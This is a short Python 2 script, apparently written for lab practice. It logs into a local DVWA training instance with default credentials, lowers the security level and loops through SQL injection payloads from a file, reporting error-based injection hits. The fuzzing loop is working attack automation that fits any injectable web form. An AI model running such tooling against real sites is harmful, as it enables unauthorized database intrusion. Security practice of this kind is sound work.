# This code can run and provide result. But need to more fine tuning.  

#>>> for form in br.forms():
#...   print "Form name:", form.name
#...   print form

#Form name: None
#<POST http://192.168.30.143/dvwa/login.php application/x-www-form-urlencoded
#  <TextControl(username=)>
#  <PasswordControl(password=)>
#  <SubmitControl(Login=Login) (readonly)>
#  <HiddenControl(user_token=5bf0a524864b2601b80ac252b9bbc13b) (readonly)>>



#!/usr/bin/env python


import mechanize
import re
import sys
from bs4 import BeautifulSoup

br = mechanize.Browser()
response1 = br.open('http://192.168.30.143/dvwa/login.php')
br.select_form(nr=0)
br.set_value("admin", name="username", nr=0)
br.set_value("password", name="password", nr=0)
br.submit()
print "DVWA Login successful"

response2=br.open('http://192.168.30.143/dvwa/security.php')
br.select_form(nr=0)
br.set_value(['low'], name='security', nr=0)
br.submit()
print "DVWA Security level set to low"


print "DVWA SQL Injection Checking...."
response3=br.open('http://192.168.30.143/dvwa/vulnerabilities/sqli/')
fd=open(sys.argv[1],"r")
for line in fd.readlines():
        sqlipayload=(line.strip())
#       print sqlipayload

#for form in br.forms():
#       print "Form name:", form.name
#       print form

        try:

                br.select_form(nr=0)
                br.set_value(sqlipayload, name="id", nr=0)
                br.submit()
                soup = BeautifulSoup(br.response().read(),'lxml')
                #print br.response().read()
                #print soup.pre
                pre_content=soup.find_all('pre')
                text_content=soup.text

                if re.search("You have an error in your SQL syntax; check the manual that corresponds to your",text_content):
                        print ("The application is vulnerable for SQL injection, Detect Error based SQLi, SQL injecton payload check  %s" %(sqlipayload))
                else:
                        print pre_content
        except:
                #print ("Error in Payload, please check again !!!")
                        pass
